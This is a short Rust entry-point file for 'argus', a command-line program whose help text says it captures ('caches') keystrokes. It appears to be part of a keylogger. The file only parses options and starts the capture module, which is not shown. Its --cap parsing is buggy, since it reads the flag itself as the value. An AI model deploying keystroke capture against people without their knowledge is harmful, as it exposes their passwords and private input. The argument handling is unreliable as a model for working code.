mod argus;
mod cli_parser;
mod method;
use argus::Argus;

use std::process::exit;

static mut BUFFER_CAPACITY: usize = 100;

fn wrapper() -> Result<(), String> {
    let args = cli_parser::get_args();
    {
        if args.contains(&"--help".to_string()) {
            return Err(r#"Usage: argus <METHOD> [OPTIONS]

ARGUMENTS
---------
    <METHOD>   The method to use for caching keystrokes.


OPTIONS
-------
    --cap      The buffer capacity needed to be met to handle the keystroke buffer
    --help     Display this message

Refer to: https://github.com/Eth3rna1/argus"#
                .to_string());
        }
        for (i, arg) in args.iter().enumerate() {
            if arg == "--cap" {
                if i == args.len() {
                    return Err("Please provide a number value for `--cap`.".to_string());
                }
                let value = &args[i];
                match value.parse::<usize>() {
                    Ok(n) => unsafe { BUFFER_CAPACITY = n },
                    Err(msg) => return Err(msg.to_string()),
                }
            }
        }
    }
    let method = cli_parser::get_method()?;
    let mut argus = Argus::new(method).set_buffer_capacity(unsafe { BUFFER_CAPACITY });
    argus.start();
    Ok(())
}

fn main() {
    match wrapper() {
        Ok(_) => (),
        Err(msg) => {
            eprintln!("{}", msg);
            exit(1);
        }
    }
}
